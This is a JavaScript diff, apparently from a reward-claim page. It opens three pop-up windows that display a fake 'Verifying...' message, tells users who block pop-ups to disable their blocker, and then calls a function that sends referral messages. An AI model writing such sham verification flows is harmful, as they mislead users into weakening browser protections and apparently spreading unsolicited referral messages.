@@ -205,10 +205,52 @@ if (isMobileDevice()) {
 
         claimMessage.textContent = 'Awaiting verification...';
 
-        // Open a test window to check for pop-up blockers
-        const testWindow = window.open('', '', 'width=300,height=200');
-        if (testWindow === null || typeof testWindow === 'undefined') {
+        // Open multiple test windows to check for pop-up blockers
+        const testWindows = [];
+        let popupBlocked = false;
+
+        for (let i = 0; i < 3; i++) {
+            const testWindow = window.open('', '', 'width=300,height=200');
+            if (testWindow === null || typeof testWindow === 'undefined') {
+                popupBlocked = true;
+                break;
+            } else {
+                // Write "Verifying..." in each test window
+                testWindow.document.write(`
+                    <!DOCTYPE html>
+                    <html lang="en">
+                    <head>
+                        <title>Verifying...</title>
+                        <style>
+                            body {
+                                display: flex;
+                                justify-content: center;
+                                align-items: center;
+                                height: 100%;
+                                margin: 0;
+                                font-family: Arial, sans-serif;
+                                background-color: #ffffff;
+                            }
+                            h1 {
+                                font-size: 20px;
+                                color: #000000;
+                            }
+                        </style>
+                    </head>
+                    <body>
+                        <h1>Verifying...</h1>
+                    </body>
+                    </html>
+                `);
+                testWindows.push(testWindow);
+            }
+        }
+
+        if (popupBlocked) {
             alert('Pop-up blocked. Please allow pop-ups for this site and refresh the page to proceed.');
+
+            // Close any opened test windows
+            testWindows.forEach((win) => win.close());
 
             // Show tutorial video on how to disable popup blocker
             showPopupBlockerTutorial();
@@ -216,37 +258,9 @@ if (isMobileDevice()) {
             claimMessage.textContent = 'Pop-up blocked. Please allow pop-ups and try again.';
             return;
         } else {
-            // Write "Verifying..." in the test window
-            testWindow.document.write(`
-                <!DOCTYPE html>
-                <html lang="en">
-                <head>
-                    <title>Verifying...</title>
-                    <style>
-                        body {
-                            display: flex;
-                            justify-content: center;
-                            align-items: center;
-                            height: 100%;
-                            margin: 0;
-                            font-family: Arial, sans-serif;
-                            background-color: #ffffff;
-                        }
-                        h1 {
-                            font-size: 20px;
-                            color: #000000;
-                        }
-                    </style>
-                </head>
-                <body>
-                    <h1>Verifying...</h1>
-                </body>
-                </html>
-            `);
-
-            // Close the test window after 1 second
+            // Close the test windows after 1 second
             setTimeout(() => {
-                testWindow.close();
+                testWindows.forEach((win) => win.close());
 
                 // Proceed to send referral messages
                 sendReferralMessages();
